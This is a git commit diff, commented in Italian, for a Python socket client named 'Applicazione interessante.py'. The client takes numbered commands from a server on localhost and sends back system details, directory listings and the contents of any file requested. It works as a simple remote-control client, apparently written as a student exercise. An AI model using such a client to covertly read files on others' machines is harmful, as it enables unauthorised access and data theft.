b6980cb64fd5d0585366a8a223bdbe44a387728d
Matteo Marino <95318540+Mathieus99@users.noreply.github.com>
2022-10-29 17:59:13 +0200

    Migliorata modularità, aggiunto disk e leggi file
    Spostate alcune funzioni di formattazione dell'output nella libreria "functions" e aggiunto funzione disk che visualizza i dischi collegati e leggi file che apre e legge i file (solo .txt)

--- Applicazione interessante.py
+++ Applicazione interessante.py
@@ -1,8 +1,12 @@
+from msilib.schema import Error
 from socket import *
 import platform
 import os
 import psutil
+from psutil._common import bytes2human
 import sys
+from functions import *
+
 serverName = 'localhost'
 serverPort = 12000
 clientSocket = socket(AF_INET, SOCK_STREAM)
@@ -15,32 +19,41 @@ while True:
         macchina = platform.machine()
         piattaforma = platform.platform()
         messaggio = 'OS: ' + piattaforma + '\nNetwork Name: ' + NetworkName + '\nType: ' + macchina
+    #Visualizza i file presenti nella directory corrente
     elif comando == "2":
         ls = os.listdir()
         messaggio = ""
         for x in ls:
             messaggio = messaggio + x + "\n"
+    #Cambia directory secondo quanto specificato in path
     elif comando[0] == "3":
         path = comando[2:]
         try:
-            os.chdir (path)
+            if path == "":
+                os.chdir(".")
+            else:
+                os.chdir (path)
             messaggio = "directory cambiata:\n" + os.getcwd()
         except FileNotFoundError:
-            messaggio = "Directory non trovato"
-        except OSError:
-            messaggio = "Sintassi errata"
+            messaggio = "Directory non trovata"
+    #Visualizza il percorso della working directory
     elif comando == "4":
         messaggio = os.getcwd()
+    #Visualizza info sul processore
     elif comando == "5":
-            cpu = platform.processor()
-            freq = psutil.cpu_freq()
-            times = psutil.cpu_times()
-            messaggio = "CPU: " + cpu + "\nCPU frequency: " + str(freq[0]) + " MHz (current) , " + str(freq[2]) + " MHz (max)\n"
-            messaggio = messaggio + "Logical Cores: " + str(psutil.cpu_count(logical=True)) + "\nPhysical Cores: " + str(psutil.cpu_count(logical=False)) + "\n"
-            messaggio = messaggio + "CPU percent: " + str(psutil.cpu_percent()) + "%\n"
-            messaggio = messaggio + "Times\nUser Mode: " + str(times[0]) + "\nKernel Mode: " + str(times[1]) + "\nIdle: " + str(times[2]) + "\nServicing HW Interrupts: " + str(times[3]) + "\nServicing procedure calls: " + str(times[4]) + "\n"
-            stats = psutil.cpu_stats()
-            messaggio = messaggio + "Stats\nContext switches (voluntary + involuntary)(since boot): " + str(stats[0]) + "\nInterrupts (since boot): " + str(stats[1]) + "\nSoftware interrupts (since boot): " + str(stats[2]) + "\nSystem calls (since boot): " + str(stats[3]) + "\n"
+        messaggio = CPUInfo()
+    elif comando == "6":
+        messaggio = MemoryInfo()
+    elif comando == "7":
+        messaggio = DiskInfo()
+    elif comando[0] == "8":
+        readFile = comando[1:]
+        try:
+            messaggio = open(readFile,"r").read()
+        except FileNotFoundError:
+            messaggio = "File non trovato\n"
+        except Exception:
+            messaggio = "Errore nell'apertura del file\n"
     elif comando == "exit":
         break
     clientSocket.send(messaggio.encode())
